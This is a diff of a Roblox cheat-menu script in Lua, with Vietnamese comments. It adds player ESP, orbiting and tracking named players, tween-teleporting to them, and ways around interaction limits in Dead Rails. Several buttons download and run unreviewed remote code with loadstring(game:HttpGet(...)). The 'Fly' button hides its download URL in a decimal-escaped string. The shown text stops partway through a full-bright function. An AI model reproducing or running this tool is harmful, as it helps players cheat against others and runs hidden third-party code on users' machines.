@@ -120,52 +120,6 @@ local Button = Tab:CreateButton({
    end,
 })
 
--- Blox fruit
-
-local Tab = Window:CreateTab("Blox Fruit", 4483362458) -- Title, Image
-
-local Section = Tab:CreateSection("Blox Kid")
-
-local Button = Tab:CreateButton({
-   Name = "Spin Fruit ( level 2600 : $414,850 )",
-   Callback = function()
-   local args = {
-    [1] = "Cousin",
-    [2] = "Buy"
-}
-
-game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Min Gaming",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/Min/refs/heads/main/MinCE"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Redz Hub",
-   Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(Settings)
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Auto Find Fruit",
-   Callback = function()
-   loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Auto Find Server",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletgojo/Haidepzai/refs/heads/main/Teddy-Premium"))()
-   end,
-})
-
 -- Misc
 
 local Tab = Window:CreateTab("Misc", 4483362458) -- Title, Image
@@ -173,7 +127,49 @@ local Tab = Window:CreateTab("Misc", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("Script")
 
 local Button = Tab:CreateButton({
-   Name = "Bay",
+   Name = "Check Ping",
+   Callback = function()
+   -- Tạo GUI hiển thị ping
+local player = game:GetService("Players").LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PingDisplay"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local pingLabel = Instance.new("TextLabel")
+pingLabel.Size = UDim2.new(0, 150, 0, 40)
+pingLabel.Position = UDim2.new(1, -160, 0, 10) -- góc trên bên phải
+pingLabel.BackgroundTransparency = 0.4
+pingLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+pingLabel.TextColor3 = Color3.new(1, 1, 1)
+pingLabel.Font = Enum.Font.GothamBold
+pingLabel.TextSize = 20
+pingLabel.Text = "PING: -- ms"
+pingLabel.Parent = screenGui
+
+-- Cập nhật ping liên tục
+while true do
+    local ping = math.floor(player:GetNetworkPing() * 1000)
+    pingLabel.Text = "PING: " .. ping .. " ms"
+
+    -- Đổi màu theo mức ping
+    if ping <= 80 then
+        pingLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- xanh
+    elseif ping <= 150 then
+        pingLabel.TextColor3 = Color3.fromRGB(255, 170, 0) -- cam
+    else
+        pingLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- đỏ
+    end
+
+    wait(1)
+end
+   end,
+})
+
+
+
+local Button = Tab:CreateButton({
+   Name = "Fly",
    Callback = function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
    end,
@@ -227,29 +223,770 @@ local Button = Tab:CreateButton({
 })
 
 local Button = Tab:CreateButton({
-   Name = "Hitbox Npc",
+   Name = "Respawn",
    Callback = function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/coqs/npc-hitbox-expander/refs/heads/main/oreo"))()
+   -- LocalScript đặt trong StarterGui hoặc StarterPlayerScripts
+
+-- Tạo GUI
+local player = game.Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RespawnGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 120, 0, 50) -- GUI nhỏ hơn
+frame.Position = UDim2.new(0.5, -60, 0.8, -25) -- căn giữa dưới màn hình
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame.Parent = screenGui
+-- Không cần Active/Draggable vì bạn yêu cầu xoá Drag
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(1, 0, 1, 0)
+button.Text = "Respawn"
+button.TextScaled = true
+button.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+button.Parent = frame
+button.Active = true
+button.Draggable = true
+-- Xử lý respawn
+local deathPosition = nil
+
+button.MouseButton1Click:Connect(function()
+    local character = player.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        -- Lưu vị trí trước khi chết
+        deathPosition = character.HumanoidRootPart.Position
+
+        -- Giết nhân vật
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        end
+    end
+end)
+
+player.CharacterAdded:Connect(function(newCharacter)
+    if deathPosition then
+        -- Khi nhân vật respawn, dịch chuyển tới vị trí đã lưu
+        local hrp = newCharacter:WaitForChild("HumanoidRootPart")
+        hrp.CFrame = CFrame.new(deathPosition)
+
+        -- Xóa vị trí để tránh lỗi dịch chuyển liên tục
+        deathPosition = nil
+    end
+end)
    end,
 })
 
 local Button = Tab:CreateButton({
-   Name = "Esp tracers",
+   Name = "Rejoin",
    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietba/Kietba/refs/heads/main/esp%20tracers.txt"))()
+   -- RejoinScript.lua
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+local placeId = game.PlaceId
+local player = Players.LocalPlayer
+
+-- Hàm Rejoin
+local function rejoinGame()
+	if player then
+		TeleportService:Teleport(placeId, player)
+	end
+end
+
+-- Gọi hàm Rejoin khi cần (VD: gán vào nút)
+rejoinGame()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Orbit Near Player",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietba/Kietba/refs/heads/main/Orbit.txt"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Orbit target player",
+   Callback = function()
+   -- GUI setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+frame.Parent = screenGui
+frame.Active = true
+frame.Draggable = true
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0, 200, 0, 40)
+textBox.Position = UDim2.new(0, 50, 0, 10)
+textBox.PlaceholderText = "Nhập tên người chơi..."
+textBox.Parent = frame
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 40)
+button.Position = UDim2.new(0, 50, 0, 60)
+button.Text = "Bật Orbit"
+button.Parent = frame
+
+-- TextBox nhỏ chỉnh tốc độ
+local speedBox = Instance.new("TextBox")
+speedBox.Size = UDim2.new(0, 80, 0, 30)
+speedBox.Position = UDim2.new(0, 110, 0, 110)
+speedBox.Text = "1"
+speedBox.PlaceholderText = "Tốc độ"
+speedBox.ClearTextOnFocus = true
+speedBox.Parent = frame
+
+-- Biến trạng thái
+local orbiting = false
+local orbitConnection = nil
+local speed = 1
+
+-- Tìm người chơi
+local function findPlayerByNameStart(namePart)
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if player.Name:lower():sub(1, #namePart) == namePart:lower() then
+			return player
+		end
+	end
+	return nil
+end
+
+-- Orbit toggle
+local function toggleOrbit()
+	if orbiting then
+		orbiting = false
+		button.Text = "Bật Orbit"
+		if orbitConnection then
+			orbitConnection:Disconnect()
+			orbitConnection = nil
+		end
+	else
+		-- Lấy tốc độ từ ô nhập
+		local inputSpeed = tonumber(speedBox.Text)
+		if inputSpeed and inputSpeed > 0 then
+			speed = inputSpeed
+		else
+			speed = 1
+			speedBox.Text = "1"
+		end
+
+		local targetName = textBox.Text
+		local targetPlayer = findPlayerByNameStart(targetName)
+		if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			local targetHRP = targetPlayer.Character.HumanoidRootPart
+			local myChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+			local angle = 0
+			orbiting = true
+			button.Text = "Tắt Orbit"
+
+			orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
+				if not orbiting or not myChar or not myChar.PrimaryPart or not targetHRP then return end
+				angle += speed
+				local radius = 10
+				local orbitPos = targetHRP.Position + Vector3.new(math.cos(math.rad(angle)) * radius, 0, math.sin(math.rad(angle)) * radius)
+				myChar:SetPrimaryPartCFrame(CFrame.new(orbitPos, targetHRP.Position))
+			end)
+		else
+			warn("Không tìm thấy người chơi phù hợp")
+		end
+	end
+end
+
+-- Gắn sự kiện
+button.MouseButton1Click:Connect(toggleOrbit)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Anti fling",
+   Callback = function()
+   -- Smart Anti-Fling: chỉ đứng im khi bị fling bất thường
+-- Đặt LocalScript vào StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local root
+local humanoid
+local safeCFrame
+
+RunService.RenderStepped:Connect(function()
+	local character = player.Character
+	if not character then return end
+
+	root = character:FindFirstChild("HumanoidRootPart")
+	humanoid = character:FindFirstChildOfClass("Humanoid")
+
+	if not root or not humanoid then return end
+
+	-- Ghi nhớ vị trí an toàn nếu tốc độ bình thường
+	if root.Velocity.Magnitude < 50 and root.RotVelocity.Magnitude < 30 then
+		safeCFrame = root.CFrame
+	else
+		-- Nếu bị fling bất thường, đứng im tại vị trí an toàn
+		if safeCFrame then
+			root.CFrame = safeCFrame
+			root.Velocity = Vector3.zero
+			root.RotVelocity = Vector3.zero
+			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+		end
+	end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "View",
+   Callback = function()
+   -- Tạo GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)  -- Kích thước nhỏ gọn
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)  -- Vị trí giữa màn hình
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+frame.Parent = screenGui
+frame.Active = true
+frame.Draggable = true
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0, 250, 0, 40)  -- Kích thước nhỏ gọn
+textBox.Position = UDim2.new(0, 25, 0, 30)  -- Vị trí hợp lý
+textBox.PlaceholderText = "Enter player..."
+textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+textBox.Font = Enum.Font.Gotham
+textBox.TextSize = 16
+textBox.Parent = frame
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 80, 0, 35)  -- Kích thước nhỏ
+button.Position = UDim2.new(0, 110, 0, 80)  -- Vị trí hợp lý
+button.Text = "View"
+button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.Gotham
+button.TextSize = 14
+button.Parent = frame
+
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 30, 0, 30)  -- Kích thước nhỏ cho nút ở góc phải
+toggleButton.Position = UDim2.new(1, -35, 0, 5)  -- Vị trí góc phải
+toggleButton.Text = ">"
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.Gotham
+toggleButton.TextSize = 18
+toggleButton.Parent = frame
+
+-- Tạo ScrollingFrame để cuộn danh sách người chơi
+local playerListFrame = Instance.new("ScrollingFrame")
+playerListFrame.Size = UDim2.new(0, 200, 0, 200)  -- Kích thước của ScrollingFrame
+playerListFrame.Position = UDim2.new(1, -220, 0, 5)  -- Dính liền bên phải nút ">"
+playerListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+playerListFrame.Visible = false  -- Ban đầu ẩn danh sách người chơi
+playerListFrame.Parent = screenGui
+playerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)  -- Đặt chiều cao của canvas (sẽ thay đổi khi thêm các nút)
+
+local playerListLayout = Instance.new("UIListLayout")
+playerListLayout.Parent = playerListFrame
+playerListLayout.Padding = UDim.new(0, 5)
+playerListFrame.ScrollBarThickness = 10  -- Độ dày thanh cuộn
+
+-- Hiển thị danh sách người chơi trong server
+local function showPlayerList()
+    -- Xóa danh sách cũ trước khi hiển thị lại
+    for _, child in pairs(playerListFrame:GetChildren()) do
+        if child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+
+    -- Lấy danh sách người chơi
+    for _, player in pairs(game.Players:GetPlayers()) do
+        local playerButton = Instance.new("TextButton")
+        playerButton.Size = UDim2.new(0, 180, 0, 30)
+        playerButton.Text = player.DisplayName  -- Hiển thị tên giả
+        playerButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+        playerButton.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+        playerButton.Font = Enum.Font.Gotham
+        playerButton.TextSize = 14
+        playerButton.Parent = playerListFrame
+
+        -- Khi nhấn vào tên giả, điền tên thật vào TextBox
+        playerButton.MouseButton1Click:Connect(function()
+            textBox.Text = player.Name  -- Điền tên thật vào TextBox
+            playerListFrame.Visible = false  -- Ẩn danh sách người chơi sau khi chọn
+            toggleButton.Text = ">"  -- Chuyển nút về trạng thái ">"
+        end)
+    end
+
+    -- Cập nhật lại CanvasSize của ScrollingFrame để phù hợp với số lượng người chơi
+    playerListFrame.CanvasSize = UDim2.new(0, 0, 0, playerListFrame.UIListLayout.AbsoluteContentSize.Y)
+end
+
+-- Biến để theo dõi camera
+local cameraToggled = false
+local currentTargetPlayer = nil
+
+-- Xử lý sự kiện khi nhấn nút Toggle
+button.MouseButton1Click:Connect(function()
+    local inputLetter = textBox.Text:sub(1, 1):upper()  -- Lấy chữ cái đầu và chuyển thành chữ hoa
+    if inputLetter and inputLetter ~= "" then
+        local foundPlayers = {}  -- Danh sách các người chơi tìm được
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player.Name:sub(1, 1):upper() == inputLetter then
+                table.insert(foundPlayers, player)  -- Thêm người chơi vào danh sách
+            end
+        end
+        
+        if #foundPlayers > 0 then
+            -- Chọn người chơi đầu tiên trong danh sách tìm thấy
+            local targetPlayer = foundPlayers[1]
+
+            -- Nếu camera đang ở chế độ theo dõi và người chơi hiện tại đã được chọn
+            if cameraToggled then
+                local camera = game.Workspace.CurrentCamera
+                camera.CameraType = Enum.CameraType.Custom  -- Đặt lại camera về chế độ mặc định (cho phép xoay)
+                cameraToggled = false
+            else
+                -- Nếu camera chưa bật theo dõi, bật camera theo dõi người chơi
+                local targetPlayerChar = targetPlayer.Character
+                if targetPlayerChar and targetPlayerChar:FindFirstChild("HumanoidRootPart") then
+                    local camera = game.Workspace.CurrentCamera
+                    camera.CameraType = Enum.CameraType.Scriptable  -- Chế độ camera cố định
+                    cameraToggled = true  -- Đánh dấu là camera đã bật theo dõi
+                    currentTargetPlayer = targetPlayer  -- Lưu người chơi hiện tại
+                end
+            end
+        else
+            -- Nếu không tìm thấy người chơi nào, hiển thị thông báo lỗi
+            local errorLabel = Instance.new("TextLabel")
+            errorLabel.Size = UDim2.new(0, 250, 0, 30)
+            errorLabel.Position = UDim2.new(0, 25, 0, 120)
+            errorLabel.Text = "Không tìm thấy người chơi!"
+            errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            errorLabel.BackgroundTransparency = 1
+            errorLabel.Font = Enum.Font.Gotham
+            errorLabel.TextSize = 14
+            errorLabel.Parent = frame
+
+            -- Làm cho thông báo lỗi biến mất sau 5 giây
+            delay(5, function()
+                errorLabel:Destroy()  -- Xóa thông báo lỗi sau 5 giây
+            end)
+        end
+    else
+        -- Nếu không nhập chữ cái, hiển thị thông báo lỗi
+        local errorLabel = Instance.new("TextLabel")
+        errorLabel.Size = UDim2.new(0, 250, 0, 30)
+        errorLabel.Position = UDim2.new(0, 25, 0, 120)
+        errorLabel.Text = "Vui lòng nhập chữ cái đầu!"
+        errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        errorLabel.BackgroundTransparency = 1
+        errorLabel.Font = Enum.Font.Gotham
+        errorLabel.TextSize = 14
+        errorLabel.Parent = frame
+
+        -- Làm cho thông báo lỗi biến mất sau 5 giây
+        delay(5, function()
+            errorLabel:Destroy()  -- Xóa thông báo lỗi sau 5 giây
+        end)
+    end
+end)
+
+-- Xử lý sự kiện khi nhấn vào nút ">"
+toggleButton.MouseButton1Click:Connect(function()
+    -- Nếu danh sách chưa hiển thị, hiển thị danh sách người chơi và chuyển nút thành "<"
+    if not playerListFrame.Visible then
+        playerListFrame.Visible = true
+        toggleButton.Text = "<"  -- Chuyển nút thành "<"
+        showPlayerList()  -- Hiển thị danh sách người chơi trong server
+    else
+        playerListFrame.Visible = false  -- Ẩn danh sách người chơi
+        toggleButton.Text = ">"  -- Chuyển nút trở lại ">"
+    end
+end)
+
+-- Theo dõi chuyển động của người chơi nếu camera đang ở chế độ theo dõi
+game:GetService("RunService").Heartbeat:Connect(function()
+    if cameraToggled and currentTargetPlayer then
+        local camera = game.Workspace.CurrentCamera
+        local targetPlayerChar = currentTargetPlayer.Character
+        if targetPlayerChar and targetPlayerChar:FindFirstChild("HumanoidRootPart") then
+            -- Cập nhật vị trí camera theo người chơi
+            camera.CFrame = CFrame.new(targetPlayerChar.HumanoidRootPart.Position + Vector3.new(0, 5, 10), targetPlayerChar.HumanoidRootPart.Position)
+        end
+    end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Tween player",
+   Callback = function()
+   -- Dịch vụ cần dùng
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- GUI chính
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+ScreenGui.Name = "TeleportGui"
+ScreenGui.ResetOnSpawn = false
+
+-- Frame chính
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 250, 0, 240)
+MainFrame.Position = UDim2.new(0.5, -125, 0.4, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+-- TextBox
+local TextBox = Instance.new("TextBox", MainFrame)
+TextBox.Size = UDim2.new(1, -40, 0, 40)
+TextBox.Position = UDim2.new(0, 10, 0, 10)
+TextBox.PlaceholderText = "Enter Name Player..."
+TextBox.Text = ""
+TextBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Nút di chuyển
+local Button = Instance.new("TextButton", MainFrame)
+Button.Size = UDim2.new(1, -20, 0, 40)
+Button.Position = UDim2.new(0, 10, 0, 60)
+Button.Text = "Tween To Player"
+Button.BackgroundColor3 = Color3.fromRGB(30, 150, 80)
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Nút lưu điểm
+local SavePointButton = Instance.new("TextButton", MainFrame)
+SavePointButton.Size = UDim2.new(1, -20, 0, 30)
+SavePointButton.Position = UDim2.new(0, 10, 0, 110)
+SavePointButton.Text = "Save Locate"
+SavePointButton.BackgroundColor3 = Color3.fromRGB(150, 150, 30)
+SavePointButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Nút tới điểm đã lưu
+local GoToSavedPointButton = Instance.new("TextButton", MainFrame)
+GoToSavedPointButton.Size = UDim2.new(1, -20, 0, 30)
+GoToSavedPointButton.Position = UDim2.new(0, 10, 0, 145)
+GoToSavedPointButton.Text = "Tween To Select"
+GoToSavedPointButton.BackgroundColor3 = Color3.fromRGB(150, 30, 150)
+GoToSavedPointButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Nút ">" mở danh sách
+local ToggleListButton = Instance.new("TextButton", MainFrame)
+ToggleListButton.Size = UDim2.new(0, 30, 0, 30)
+ToggleListButton.Position = UDim2.new(1, -35, 0, 110)
+ToggleListButton.Text = ">"
+ToggleListButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+ToggleListButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Danh sách điểm đã lưu
+local SavedListFrame = Instance.new("ScrollingFrame", MainFrame)
+SavedListFrame.Size = UDim2.new(0, 150, 0, 100)
+SavedListFrame.Position = UDim2.new(1, 5, 0, 110)
+SavedListFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+SavedListFrame.BorderSizePixel = 0
+SavedListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+SavedListFrame.ScrollBarThickness = 4
+SavedListFrame.Visible = false
+
+-- Danh sách điểm
+local savedPoints = {}
+local selectedPointName = nil
+
+-- Hiển thị thông báo
+local function showStatusMessage(message)
+	local status = Instance.new("TextLabel", MainFrame)
+	status.Size = UDim2.new(1, -20, 0, 20)
+	status.Position = UDim2.new(0, 10, 1, -25)
+	status.BackgroundTransparency = 1
+	status.TextColor3 = Color3.new(1, 1, 1)
+	status.TextScaled = true
+	status.Text = message
+
+	wait(1)
+	status:Destroy()
+end
+
+-- Cập nhật danh sách điểm đã lưu
+local function updateSavedList()
+	SavedListFrame:ClearAllChildren()
+	SavedListFrame.CanvasSize = UDim2.new(0, 0, 0, #savedPoints * 30)
+
+	for i, pointData in ipairs(savedPoints) do
+		local button = Instance.new("TextButton", SavedListFrame)
+		button.Size = UDim2.new(1, -10, 0, 30)
+		button.Position = UDim2.new(0, 5, 0, (i - 1) * 30)
+		button.Text = pointData.name
+		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+		button.TextColor3 = Color3.new(1, 1, 1)
+
+		button.MouseButton1Click:Connect(function()
+			selectedPointName = pointData.name
+			showStatusMessage("Select: " .. selectedPointName)
+		end)
+	end
+end
+
+-- Lưu điểm hiện tại
+SavePointButton.MouseButton1Click:Connect(function()
+	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local hrp = character:WaitForChild("HumanoidRootPart")
+
+	local pointName = "Locate " .. tostring(#savedPoints + 1)
+	table.insert(savedPoints, {name = pointName, cframe = hrp.CFrame})
+	showStatusMessage("Save " .. pointName)
+	updateSavedList()
+end)
+
+-- Tween đến điểm đã chọn
+GoToSavedPointButton.MouseButton1Click:Connect(function()
+	if not selectedPointName then
+		showStatusMessage("No save points yet")
+		return
+	end
+
+	local point = nil
+	for _, p in pairs(savedPoints) do
+		if p.name == selectedPointName then
+			point = p
+			break
+		end
+	end
+
+	if point then
+		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+		local hrp = character:WaitForChild("HumanoidRootPart")
+		local tween = TweenService:Create(hrp, TweenInfo.new(1), {CFrame = point.cframe})
+		tween:Play()
+		showStatusMessage("Đã tới " .. selectedPointName)
+	else
+		showStatusMessage("Không tìm thấy điểm đã lưu.")
+	end
+end)
+
+-- Nút toggle danh sách
+ToggleListButton.MouseButton1Click:Connect(function()
+	SavedListFrame.Visible = not SavedListFrame.Visible
+	ToggleListButton.Text = SavedListFrame.Visible and "<" or ">"
+end)
+
+-- Tween tới người chơi
+Button.MouseButton1Click:Connect(function()
+	local name = TextBox.Text
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and string.lower(player.Name):find(string.lower(name)) then
+			local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+			if targetHRP then
+				local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+				local myHRP = character:WaitForChild("HumanoidRootPart")
+				local tween = TweenService:Create(myHRP, TweenInfo.new(1), {CFrame = targetHRP.CFrame * CFrame.new(0, 0, -3)})
+				tween:Play()
+				showStatusMessage("Đã tới " .. player.Name)
+				return
+			end
+		end
+	end
+	showStatusMessage("Không tìm thấy người chơi.")
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Esp player",
+   Callback = function()
+   local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to add ESP to a player
+local function addESP(player)
+	if player == LocalPlayer then return end
+
+	local function onCharacterAdded(character)
+		local highlight = Instance.new("Highlight")
+		highlight.Name = "ESP_Highlight"
+		highlight.FillColor = Color3.fromRGB(0, 0, 0) -- Blue
+		highlight.OutlineColor = Color3.fromRGB(0, 0, 1)
+		highlight.OutlineTransparency = 0
+		highlight.FillTransparency = 1
+		highlight.Adornee = character
+		highlight.Parent = character
+
+		local head = character:WaitForChild("Head", 5)
+		if head then
+			local billboard = Instance.new("BillboardGui")
+			billboard.Name = "ESP_Name"
+			billboard.Size = UDim2.new(0, 100, 0, 30)
+			billboard.StudsOffset = Vector3.new(0, 2, 0)
+			billboard.AlwaysOnTop = true
+			billboard.Adornee = head
+			billboard.Parent = head
+
+			local nameLabel = Instance.new("TextLabel")
+			nameLabel.Size = UDim2.new(1, 0, 1, 0)
+			nameLabel.BackgroundTransparency = 1
+			nameLabel.Text = player.Name
+			nameLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+			nameLabel.TextStrokeTransparency = 0.5
+			nameLabel.TextScaled = true
+			nameLabel.Font = Enum.Font.SourceSansBold
+			nameLabel.Parent = billboard
+		end
+	end
+
+	-- Handle character spawn
+	if player.Character then
+		onCharacterAdded(player.Character)
+	end
+	player.CharacterAdded:Connect(onCharacterAdded)
+end
+
+-- Add ESP to all players
+for _, player in pairs(Players:GetPlayers()) do
+	addESP(player)
+end
+
+-- Add ESP to new players
+Players.PlayerAdded:Connect(function(player)
+	addESP(player)
+end)
+   end,
+})
+
+-- Door
+
+local Tab = Window:CreateTab("Door", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Door")
+
+local Button = Tab:CreateButton({
+   Name = "Door by kibazhub ( dont use this in game dead rail )",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietba/Kietba/refs/heads/main/Door%20all%20in%20here"))()
    end,
 })
 
 -- Dead rails
 
-local Tab = Window:CreateTab("Dead rails", 4483362458) -- Title, Image
+local Tab = Window:CreateTab("Dead rail", 4483362458) -- Title, Image
 
 local Section = Tab:CreateSection("Dead rails")
 
 local Button = Tab:CreateButton({
-   Name = "Esp Mob , kill aura v.v",
+   Name = "Instant Interact",
    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/thiennrb7/Script/refs/heads/main/Bringall"))()
+   -- LocalScript (place in StarterPlayer > StarterPlayerScripts)
+
+local Players = game:GetService("Players")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+
+-- Make all proximity prompts instantly interact
+ProximityPromptService.PromptShown:Connect(function(prompt)
+	prompt.HoldDuration = 0 -- Instantly interact when touched
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "interact through object",
+   Callback = function()
+   -- LocalScript (place in StarterPlayer > StarterPlayerScripts)
+
+local ProximityPromptService = game:GetService("ProximityPromptService")
+
+-- Allow interaction through walls or transparent objects
+ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+	-- Force interaction regardless of obstructions
+	prompt.MaxActivationDistance = math.huge -- Makes it interactable from any distance
+end)
+
+-- Optionally, change this globally for all prompts as soon as they appear
+ProximityPromptService.PromptShown:Connect(function(prompt)
+	prompt.RequiresLineOfSight = false -- Let it be triggered through objects
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Max interact",
+   Callback = function()
+   -- LocalScript (place in StarterPlayer > StarterPlayerScripts)
+
+local ProximityPromptService = game:GetService("ProximityPromptService")
+
+-- Function to max out interaction range for new prompts
+local function upgradePrompt(prompt)
+	prompt.MaxActivationDistance = 500 -- Adjust as needed (1000 = super far)
+end
+
+-- Modify all existing prompts in the game
+for _, prompt in pairs(workspace:GetDescendants()) do
+	if prompt:IsA("ProximityPrompt") then
+		upgradePrompt(prompt)
+	end
+end
+
+-- Apply to future prompts that appear
+ProximityPromptService.PromptShown:Connect(function(prompt)
+	upgradePrompt(prompt)
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Full bright",
+   Callback = function()
+   -- FullBright Script (works on mobile too)
+local lighting = game:GetService("Lighting")
+
+-- Save original settings (optional if you want to toggle later)
+local originalBrightness = lighting.Brightness
+local originalTimeOfDay = lighting.TimeOfDay
+local originalFogEnd = lighting.FogEnd
+local originalAmbient = lighting.Ambient
+
+-- Apply FullBright settings
+lighting.Brightness = 2
+lighting.ClockTime = 12 -- Noon
+lighting.FogEnd = 1000000
+lighting.GlobalShadows = false
+lighting.OutdoorAmbient = Color3.new(1, 1, 1)
+lighting.Ambient = Color3.new(1, 1, 1)
+
+-- Optional: Prevent future changes (anti-darkness)
+lighting:GetPropertyChangedSignal("ClockTime"):Connect(function()
+	lighting.ClockTime = 12
+end)
+
